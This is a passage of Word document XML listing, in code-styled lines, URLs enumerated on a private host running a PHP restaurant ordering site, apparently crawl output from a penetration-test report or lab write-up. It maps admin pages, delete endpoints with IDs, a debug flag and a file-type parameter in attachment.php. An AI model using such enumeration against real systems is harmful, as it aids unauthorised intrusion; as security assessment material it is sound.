        <w:t>http://192.168.1.20/admin/accounts.php%20debug=true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD67048" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/activate-currency.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F9E3593" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/activate-timezone.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637A23D0" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/admin.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FBCD37A" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/allocation.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A09E541" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/categories-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18ACEB12" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/categories.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC2E010" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/currencies-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1AAD71" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-category.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697C838B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-category.php?id=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CF4DE0" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-currency.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73EB772B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-food.php?id=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B47A2EF" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-member.php?id=16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76427D78" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-partyhall.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD44BD8" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-quantity.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E6E82FF" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-question.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A44F46" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-rating.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A81F3B8" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-special.php?id=7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566F91AA" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-table.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11340CF7" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/delete-timezone.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E209EB" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/foods-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA339F6" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/foods.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F3780C" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/index.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15512A7F" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/login-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D7FE36" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/login-form.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4040AD" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/logout.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFDE544" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/message-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1051594B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/messages.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BDB41D4" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/options.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4579229B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/orders-allocation.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53315DD0" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/orders.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E8D5AC" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/partyhalls-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A59EA8C" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/profile.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5687C623" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/quantities-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C91F48" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/questions-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC1DC95" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>http://192.168.1.20/admin/ratings-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27380849" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/reservations-allocation.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA2AF4A" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/reservations.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2B6A66" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/specials-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9D8D97" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/specials.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164DBF16" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/staff-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA871C1" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/stylesheets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C20CCE2" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/stylesheets/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5160D6CA" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/stylesheets/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1CD150" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/stylesheets/admin_styles.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9699F0" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/tables-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9C8F04" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/timezone-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102745A0" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/update-exec.php?id=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA6D54E" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1451E46F" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/validation/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B53AA9" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/validation/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5798320C" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/validation/admin.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C4C93C" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/attachment.php?=</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C68B23B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/attachment.php?type=terms.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278A3416" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/billing-alternative.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFD01BC" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/billing-exec.php?id=18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34389005" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/billing-success.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F9DA11" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/cart-exec.php?=</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242FBE9B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/cart-exec.php?id=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B000AC" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/cart.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3916A173" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/changepicture.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343C7FE3" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/contactus.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1002E968" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC0E843" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/css/</w:t>
      </w:r>
    </w:p>
